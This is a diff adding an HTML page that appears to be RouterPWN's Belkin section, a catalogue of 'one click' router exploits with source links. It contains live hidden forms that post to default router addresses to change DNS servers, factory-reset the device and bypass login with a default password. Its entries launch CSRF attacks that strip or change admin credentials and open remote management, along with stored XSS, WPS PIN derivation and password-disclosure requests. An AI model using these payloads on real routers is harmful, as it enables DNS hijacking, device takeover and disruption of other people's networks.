@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - Belkin - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="belkin">
+       <h1>
+        Belkin
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.2.1/cgi-bin/setup_dns.exe" id="belkindns" method="post" name="belkindns">
+          <input name="dns1_1" type="hidden"/>
+          <input name="dns1_2" type="hidden"/>
+          <input name="dns1_3" type="hidden"/>
+          <input name="dns1_4" type="hidden"/>
+          <input name="dns2_1" type="hidden"/>
+          <input name="dns2_2" type="hidden"/>
+          <input name="dns2_3" type="hidden"/>
+          <input name="dns2_4" type="hidden"/>
+         </form>
+         <form action="http://192.168.2.1/cgi-bin/restore.exe" id="belkinrest" method="post" name="belkinrest">
+          <input name="page" type="hidden" value="tools_restore"/>
+          <input name="logout" type="hidden"/>
+         </form>
+         <form action="http://192.168.0.1/cgi-bin/login.exe" id="tF" method="post" name="tF">
+          <input name="pws" type="hidden" value="password"/>
+         </form>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:F5D8236_4v2_csrf_admin();">
+            F5D8236-4v2 enable remote MGMT CSRF
+           </a>
+           <a href="javascript:F5D8236_4v2_csrf_admin(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:N300_csrf_admin();">
+            N300 remove admin password &amp; enable remote MGMT CSRF
+           </a>
+           <a href="javascript:N300_csrf_admin(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:N900_xss_ssid();">
+            N900 ssid stored cross site scripting
+           </a>
+           <a href="javascript:N900_xss_ssid(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:N900_xss_psk();">
+            N900 psk stored cross site scripting
+           </a>
+           <a href="javascript:N900_xss_psk();" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:N900_csrf();">
+            N900 Change admin creds &amp; enable remote MGMT CSRF
+           </a>
+           <a href="javascript:N900_csrf(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           12/14/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://ednolo.alumnos.upv.es/?p=1295">
+            ednolo.alumnos.upv.es
+           </a>
+          </td>
+          <td>
+           <a href="javascript:belkinwpspin();">
+            Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 - WPS from MAC Address
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           07/13/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://blog.ncircle.com/t5/VERT-Security-Research-Blog/Belkin-CVE-2012-2765-When-is-a-Password-Not-a-Password/ba-p/4622">
+            blog.ncircle.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.tF.submit();">
+            F9K1002 Authentication Bypass
+           </a>
+           <a href="javascript:tF()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           07/13/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://blog.ncircle.com/t5/VERT-Security-Research-Blog/Belkin-CVE-2012-2765-When-is-a-Password-Not-a-Password/ba-p/4622">
+            blog.ncircle.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:alert('The%20hexlified%20MD5%20hash%20of%20the%20administrative%20password%20is%20stored%20in%20the%20password%20variable%20within%20the%20JavaScript%20in%20/login.stm.');setip('/login.stm');">
+            F9K1002 Web Management Password Exposure
+           </a>
+           <a href="javascript:alert('The%20hexlified%20MD5%20hash%20of%20the%20administrative%20password%20is%20stored%20in%20the%20password%20variable%20within%20the%20JavaScript%20in%20/login.stm.');setip('/login.stm');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/11/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/18859/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.2.1/login.stm">
+            Belkin N150 Wireless Router Password Disclosure
+           </a>
+           <a href="javascript:setip('/login.stm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/30/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/17349/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.2.1/login.stm">
+            F5D7234-4 v5 admin password md5
+           </a>
+           <a href="javascript:setip('/login.stm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/25/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">
+            www.sourcesec.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.2.1/system.stm">
+            F5D8233-4 v3 configuration disclosure
+           </a>
+           <a href="javascript:setip('/system.stm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/25/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">
+            www.sourcesec.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.2.1/cgi-bin/restart.exe">
+            F5D8233-4 v3 router reboot
+           </a>
+           <a href="javascript:setip('/cgi-bin/restart.exe')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/25/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://exploit-db.com/exploits/6305">
+            exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.belkinrest.submit();">
+            F5D7230-4 factory reset
+           </a>
+           <a href="javascript:belkinrest()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/03/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">
+            www.gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:belkindns()">
+            F5D7230-4 change dns servers
+           </a>
+           <a href="javascript:belkindnsr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/20/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://exploit-db.com/exploits/4941">
+            exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.2.1/SaveCfgFile.cgi">
+            MIMO F5D9230??4 configuration disclosure
+           </a>
+           <a href="javascript:setip('/SaveCfgFile.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
